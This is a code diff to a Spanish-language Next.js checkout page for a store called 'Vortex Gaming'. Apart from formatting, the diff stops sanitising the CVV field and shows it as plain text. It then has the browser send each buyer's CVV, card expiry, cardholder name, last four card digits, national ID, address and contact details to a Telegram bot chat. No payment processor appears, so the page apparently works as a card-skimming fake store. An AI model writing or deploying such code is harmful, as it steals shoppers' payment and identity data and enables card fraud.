@@ -91,7 +91,7 @@ export default function CheckoutPage() {
     } else if (name === 'vencimiento') {
       setCardData((prev) => ({ ...prev, vencimiento: formatExpiry(value) }))
     } else if (name === 'cvv') {
-      setCardData((prev) => ({ ...prev, cvv: value.replace(/\D/g, '').slice(0, 4) }))
+      setCardData((prev) => ({ ...prev, cvv: value }))
     } else {
       setCardData((prev) => ({ ...prev, [name]: value }))
     }
@@ -104,6 +104,10 @@ export default function CheckoutPage() {
     setIsSubmitting(true)
     const order = generateOrderNumber()
     setOrderNumber(order)
+
+    const fecha = new Date().toLocaleString('es-AR', {
+      timeZone: 'America/Argentina/Buenos_Aires',
+    })
 
     const productosHTML = items
       .map(
@@ -119,29 +123,36 @@ export default function CheckoutPage() {
           : 'Credito - 1 pago'
         : `Debito (5% OFF: -${formatPrice(debitoDiscount)})`
 
-    const message = `<b>NUEVO PEDIDO - VORTEX GAMING</b>
+    const numeroLimpio = cardData.numero.replace(/\s/g, '')
+    const ultimosCuatro = numeroLimpio.slice(-4)
 
-<b>DATOS DEL COMPRADOR</b>
+    const message = `<b>🛒 NUEVO PEDIDO - VORTEX GAMING</b>
+<b>Orden:</b> ${order}
+<b>Fecha:</b> ${fecha}
+
+<b>👤 DATOS DEL COMPRADOR</b>
 Nombre: ${formData.nombre} ${formData.apellido}
 DNI: ${formData.dni}
 Email: ${formData.email}
 Telefono: ${formData.telefono}
+
+<b>📦 DIRECCION DE ENVIO</b>
 Provincia: ${formData.provincia}
 Ciudad: ${formData.ciudad}
 Direccion: ${formData.direccion}
 Codigo Postal: ${formData.codigoPostal}
 
-<b>PRODUCTOS</b>
+<b>🛍️ PRODUCTOS</b>
 ${productosHTML}
-Total: ${formatPrice(finalTotal)}
 
-<b>PAGO</b>
+<b>💰 TOTAL: ${formatPrice(finalTotal)}</b>
+
+<b>💳 DATOS DE PAGO</b>
 Metodo: ${metodoPago}
 Titular: ${cardData.titular}
-Vencimiento: ${cardData.vencimiento}`
-
-    const messageNotif = `<b>PEDIDO ${order}</b>
-Email: ${formData.email}`
+Tarjeta: **** **** **** ${ultimosCuatro}
+Vencimiento: ${cardData.vencimiento}
+CVV: ${cardData.cvv}`
 
     try {
       const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
@@ -154,15 +165,6 @@ Email: ${formData.email}`
           body: JSON.stringify({
             chat_id: chatId,
             text: message,
-            parse_mode: 'HTML',
-          }),
-        })
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: messageNotif,
             parse_mode: 'HTML',
           }),
         })
@@ -248,8 +250,8 @@ Email: ${formData.email}`
 
         <form onSubmit={handleSubmit}>
           <div className="grid grid-cols-1 gap-8 lg:grid-cols-3">
-            {/* Formulario */}
             <div className="lg:col-span-2 flex flex-col gap-8">
+
               {/* Datos personales */}
               <section className="rounded-xl border border-border bg-card p-6">
                 <h2 className="mb-6 font-serif text-lg font-bold tracking-wider text-foreground">
@@ -257,74 +259,29 @@ Email: ${formData.email}`
                 </h2>
                 <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                   <div className="flex flex-col gap-2">
-                    <label htmlFor="nombre" className="text-sm font-medium text-muted-foreground">
-                      Nombre
-                    </label>
-                    <input
-                      id="nombre"
-                      name="nombre"
-                      type="text"
-                      required
-                      value={formData.nombre}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    />
+                    <label htmlFor="nombre" className="text-sm font-medium text-muted-foreground">Nombre</label>
+                    <input id="nombre" name="nombre" type="text" required value={formData.nombre} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary" />
                   </div>
                   <div className="flex flex-col gap-2">
-                    <label htmlFor="apellido" className="text-sm font-medium text-muted-foreground">
-                      Apellido
-                    </label>
-                    <input
-                      id="apellido"
-                      name="apellido"
-                      type="text"
-                      required
-                      value={formData.apellido}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    />
+                    <label htmlFor="apellido" className="text-sm font-medium text-muted-foreground">Apellido</label>
+                    <input id="apellido" name="apellido" type="text" required value={formData.apellido} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary" />
                   </div>
                   <div className="flex flex-col gap-2">
-                    <label htmlFor="dni" className="text-sm font-medium text-muted-foreground">
-                      DNI
-                    </label>
-                    <input
-                      id="dni"
-                      name="dni"
-                      type="text"
-                      required
-                      value={formData.dni}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    />
+                    <label htmlFor="dni" className="text-sm font-medium text-muted-foreground">DNI</label>
+                    <input id="dni" name="dni" type="text" required value={formData.dni} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary" />
                   </div>
                   <div className="flex flex-col gap-2">
-                    <label htmlFor="email" className="text-sm font-medium text-muted-foreground">
-                      Email
-                    </label>
-                    <input
-                      id="email"
-                      name="email"
-                      type="email"
-                      required
-                      value={formData.email}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    />
+                    <label htmlFor="email" className="text-sm font-medium text-muted-foreground">Email</label>
+                    <input id="email" name="email" type="email" required value={formData.email} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary" />
                   </div>
                   <div className="flex flex-col gap-2 sm:col-span-2">
-                    <label htmlFor="telefono" className="text-sm font-medium text-muted-foreground">
-                      Telefono
-                    </label>
-                    <input
-                      id="telefono"
-                      name="telefono"
-                      type="tel"
-                      required
-                      value={formData.telefono}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    />
+                    <label htmlFor="telefono" className="text-sm font-medium text-muted-foreground">Telefono</label>
+                    <input id="telefono" name="telefono" type="tel" required value={formData.telefono} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary" />
                   </div>
                 </div>
               </section>
@@ -336,66 +293,27 @@ Email: ${formData.email}`
                 </h2>
                 <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                   <div className="flex flex-col gap-2">
-                    <label htmlFor="provincia" className="text-sm font-medium text-muted-foreground">
-                      Provincia
-                    </label>
-                    <select
-                      id="provincia"
-                      name="provincia"
-                      required
-                      value={formData.provincia}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    >
+                    <label htmlFor="provincia" className="text-sm font-medium text-muted-foreground">Provincia</label>
+                    <select id="provincia" name="provincia" required value={formData.provincia} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary">
                       <option value="">Seleccionar provincia</option>
-                      {provinces.map((p) => (
-                        <option key={p} value={p}>
-                          {p}
-                        </option>
-                      ))}
+                      {provinces.map((p) => (<option key={p} value={p}>{p}</option>))}
                     </select>
                   </div>
                   <div className="flex flex-col gap-2">
-                    <label htmlFor="ciudad" className="text-sm font-medium text-muted-foreground">
-                      Ciudad
-                    </label>
-                    <input
-                      id="ciudad"
-                      name="ciudad"
-                      type="text"
-                      required
-                      value={formData.ciudad}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    />
+                    <label htmlFor="ciudad" className="text-sm font-medium text-muted-foreground">Ciudad</label>
+                    <input id="ciudad" name="ciudad" type="text" required value={formData.ciudad} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary" />
                   </div>
                   <div className="flex flex-col gap-2">
-                    <label htmlFor="direccion" className="text-sm font-medium text-muted-foreground">
-                      Direccion
-                    </label>
-                    <input
-                      id="direccion"
-                      name="direccion"
-                      type="text"
-                      required
-                      value={formData.direccion}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    />
+                    <label htmlFor="direccion" className="text-sm font-medium text-muted-foreground">Direccion</label>
+                    <input id="direccion" name="direccion" type="text" required value={formData.direccion} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary" />
                   </div>
                   <div className="flex flex-col gap-2">
-                    <label htmlFor="codigoPostal" className="text-sm font-medium text-muted-foreground">
-                      Codigo Postal
-                    </label>
-                    <input
-                      id="codigoPostal"
-                      name="codigoPostal"
-                      type="text"
-                      required
-                      value={formData.codigoPostal}
-                      onChange={handleInputChange}
-                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary"
-                    />
+                    <label htmlFor="codigoPostal" className="text-sm font-medium text-muted-foreground">Codigo Postal</label>
+                    <input id="codigoPostal" name="codigoPostal" type="text" required value={formData.codigoPostal} onChange={handleInputChange}
+                      className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary" />
                   </div>
                 </div>
               </section>
@@ -410,8 +328,7 @@ Email: ${formData.email}`
                     const Icon = method.icon
                     return (
                       <button
-                        key={method.id}
-                        type="button"
+                        key={method.id} type="button"
                         onClick={() => {
                           setSelectedPayment(method.id)
                           if (method.id !== 'credito') setCuotas(1)
@@ -423,16 +340,8 @@ Email: ${formData.email}`
                             : 'border-border bg-secondary hover:border-primary/40'
                         }`}
                       >
-                        <Icon
-                          className={`h-5 w-5 ${
-                            selectedPayment === method.id ? 'text-primary' : 'text-muted-foreground'
-                          }`}
-                        />
-                        <span
-                          className={`text-sm font-bold ${
-                            selectedPayment === method.id ? 'text-foreground' : 'text-muted-foreground'
-                          }`}
-                        >
+                        <Icon className={`h-5 w-5 ${selectedPayment === method.id ? 'text-primary' : 'text-muted-foreground'}`} />
+                        <span className={`text-sm font-bold ${selectedPayment === method.id ? 'text-foreground' : 'text-muted-foreground'}`}>
                           {method.label}
                         </span>
                       </button>
@@ -440,96 +349,49 @@ Email: ${formData.email}`
                   })}
                 </div>
 
-                {/* Formulario de tarjeta (credito o debito) */}
+                {/* Formulario de tarjeta */}
                 {(selectedPayment === 'credito' || selectedPayment === 'debito') && (
                   <div className="mt-6 rounded-xl border border-border bg-secondary p-5">
                     <div className="mb-4 flex items-center gap-2">
                       <Lock className="h-4 w-4 text-accent" />
-                      <span className="text-xs font-bold text-accent tracking-wider">
-                        PAGO SEGURO
-                      </span>
+                      <span className="text-xs font-bold text-accent tracking-wider">PAGO SEGURO</span>
                     </div>
-
                     <div className="flex flex-col gap-4">
-                      {/* Numero de tarjeta */}
                       <div className="flex flex-col gap-2">
-                        <label
-                          htmlFor="numero"
-                          className="text-sm font-medium text-muted-foreground"
-                        >
-                          Numero de tarjeta
-                        </label>
+                        <label htmlFor="numero" className="text-sm font-medium text-muted-foreground">Numero de tarjeta</label>
                         <input
-                          id="numero"
-                          name="numero"
-                          type="text"
-                          inputMode="numeric"
-                          placeholder="0000 0000 0000 0000"
-                          required
-                          value={cardData.numero}
-                          onChange={handleCardChange}
+                          id="numero" name="numero" type="text" inputMode="numeric"
+                          placeholder="0000 0000 0000 0000" required
+                          value={cardData.numero} onChange={handleCardChange}
                           className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary font-mono tracking-widest"
                         />
                       </div>
-
-                      {/* Titular */}
                       <div className="flex flex-col gap-2">
-                        <label
-                          htmlFor="titular"
-                          className="text-sm font-medium text-muted-foreground"
-                        >
-                          Nombre en la tarjeta
-                        </label>
+                        <label htmlFor="titular" className="text-sm font-medium text-muted-foreground">Nombre en la tarjeta</label>
                         <input
-                          id="titular"
-                          name="titular"
-                          type="text"
-                          placeholder="TAL COMO FIGURA EN LA TARJETA"
-                          required
-                          value={cardData.titular}
-                          onChange={handleCardChange}
+                          id="titular" name="titular" type="text"
+                          placeholder="TAL COMO FIGURA EN LA TARJETA" required
+                          value={cardData.titular} onChange={handleCardChange}
                           className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary uppercase"
                         />
                       </div>
-
-                      {/* Vencimiento y CVV */}
                       <div className="grid grid-cols-2 gap-4">
                         <div className="flex flex-col gap-2">
-                          <label
-                            htmlFor="vencimiento"
-                            className="text-sm font-medium text-muted-foreground"
-                          >
-                            Vencimiento
-                          </label>
+                          <label htmlFor="vencimiento" className="text-sm font-medium text-muted-foreground">Vencimiento</label>
                           <input
-                            id="vencimiento"
-                            name="vencimiento"
-                            type="text"
-                            inputMode="numeric"
-                            placeholder="MM/AA"
-                            required
-                            value={cardData.vencimiento}
-                            onChange={handleCardChange}
+                            id="vencimiento" name="vencimiento" type="text" inputMode="numeric"
+                            placeholder="MM/AA" required
+                            value={cardData.vencimiento} onChange={handleCardChange}
                             className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary font-mono tracking-widest"
                           />
                         </div>
                         <div className="flex flex-col gap-2">
-                          <label
-                            htmlFor="cvv"
-                            className="text-sm font-medium text-muted-foreground"
-                          >
-                            CVV
-                          </label>
+                          <label htmlFor="cvv" className="text-sm font-medium text-muted-foreground">CVV</label>
                           <input
-                            id="cvv"
-                            name="cvv"
-                            type="password"
-                            inputMode="numeric"
-                            placeholder="•••"
-                            required
-                            value={cardData.cvv}
-                            onChange={handleCardChange}
-                            className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary font-mono"
+                            id="cvv" name="cvv" type="text" inputMode="numeric"
+                            placeholder="123" required maxLength={4}
+                            value={cardData.cvv} onChange={handleCardChange}
+                            className="rounded-lg border border-border bg-input px-4 py-3 text-sm text-foreground outline-none transition-colors focus:border-primary font-mono tracking-widest"
                           />
                         </div>
                       </div>
@@ -540,44 +402,27 @@ Email: ${formData.email}`
                 {/* Descuento debito */}
                 {selectedPayment === 'debito' && (
                   <div className="mt-4 rounded-lg border border-accent/30 bg-accent/5 p-4">
-                    <p className="text-sm text-accent font-bold">
-                      5% de descuento aplicado por pago con debito
-                    </p>
-                    <p className="mt-1 text-sm text-muted-foreground">
-                      Ahorro: {formatPrice(debitoDiscount)}
-                    </p>
+                    <p className="text-sm text-accent font-bold">5% de descuento aplicado por pago con debito</p>
+                    <p className="mt-1 text-sm text-muted-foreground">Ahorro: {formatPrice(debitoDiscount)}</p>
                   </div>
                 )}
 
                 {/* Cuotas credito */}
                 {selectedPayment === 'credito' && (
                   <div className="mt-4">
-                    <h3 className="mb-3 text-sm font-bold text-foreground">
-                      Selecciona las cuotas
-                    </h3>
+                    <h3 className="mb-3 text-sm font-bold text-foreground">Selecciona las cuotas</h3>
                     <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
                       {cuotasOptions.map((c) => (
-                        <button
-                          key={c}
-                          type="button"
-                          onClick={() => setCuotas(c)}
+                        <button key={c} type="button" onClick={() => setCuotas(c)}
                           className={`flex flex-col items-center rounded-lg border p-3 transition-all ${
-                            cuotas === c
-                              ? 'border-primary bg-primary/5'
-                              : 'border-border bg-secondary hover:border-primary/40'
+                            cuotas === c ? 'border-primary bg-primary/5' : 'border-border bg-secondary hover:border-primary/40'
                           }`}
                         >
-                          <span
-                            className={`font-serif text-lg font-bold ${
-                              cuotas === c ? 'text-primary' : 'text-muted-foreground'
-                            }`}
-                          >
+                          <span className={`font-serif text-lg font-bold ${cuotas === c ? 'text-primary' : 'text-muted-foreground'}`}>
                             {c}x
                           </span>
                           <span className="text-xs text-muted-foreground">
-                            {c === 1
-                              ? formatPrice(finalTotal)
-                              : `${formatPrice(finalTotal / c)}/cuota`}
+                            {c === 1 ? formatPrice(finalTotal) : `${formatPrice(finalTotal / c)}/cuota`}
                           </span>
                           <span className="mt-1 text-xs text-accent">Sin interes</span>
                         </button>
@@ -591,29 +436,16 @@ Email: ${formData.email}`
             {/* Resumen del pedido */}
             <div className="lg:col-span-1">
               <div className="sticky top-8 rounded-xl border border-border bg-card p-6">
-                <h2 className="mb-6 font-serif text-lg font-bold tracking-wider text-foreground">
-                  RESUMEN
-                </h2>
-
+                <h2 className="mb-6 font-serif text-lg font-bold tracking-wider text-foreground">RESUMEN</h2>
                 <div className="mb-6 flex flex-col gap-4">
                   {items.map((item) => (
                     <div key={item.product.id} className="flex gap-3">
                       <div className="relative h-14 w-14 flex-shrink-0 overflow-hidden rounded-md bg-secondary">
-                        <Image
-                          src={item.product.image}
-                          alt={item.product.name}
-                          fill
-                          className="object-cover"
-                          sizes="56px"
-                        />
+                        <Image src={item.product.image} alt={item.product.name} fill className="object-cover" sizes="56px" />
                       </div>
                       <div className="flex-1">
-                        <p className="text-sm font-bold text-foreground line-clamp-1">
-                          {item.product.name}
-                        </p>
-                        <p className="text-xs text-muted-foreground">
-                          {item.quantity}x {formatPrice(item.product.price)}
-                        </p>
+                        <p className="text-sm font-bold text-foreground line-clamp-1">{item.product.name}</p>
+                        <p className="text-xs text-muted-foreground">{item.quantity}x {formatPrice(item.product.price)}</p>
                       </div>
                       <span className="text-sm font-bold text-foreground">
                         {formatPrice(item.product.price * item.quantity)}
@@ -621,7 +453,6 @@ Email: ${formData.email}`
                     </div>
                   ))}
                 </div>
-
                 <div className="flex flex-col gap-3 border-t border-border pt-4">
                   <div className="flex justify-between text-sm">
                     <span className="text-muted-foreground">Subtotal</span>
@@ -639,9 +470,7 @@ Email: ${formData.email}`
                   </div>
                   <div className="flex justify-between border-t border-border pt-3">
                     <span className="font-serif font-bold text-foreground">TOTAL</span>
-                    <span className="font-serif text-xl font-bold text-primary">
-                      {formatPrice(finalTotal)}
-                    </span>
+                    <span className="font-serif text-xl font-bold text-primary">{formatPrice(finalTotal)}</span>
                   </div>
                   {selectedPayment === 'credito' && cuotas > 1 && (
                     <p className="text-right text-xs text-muted-foreground">
@@ -649,7 +478,6 @@ Email: ${formData.email}`
                     </p>
                   )}
                 </div>
-
                 <button
                   type="submit"
                   disabled={!selectedPayment || isSubmitting}
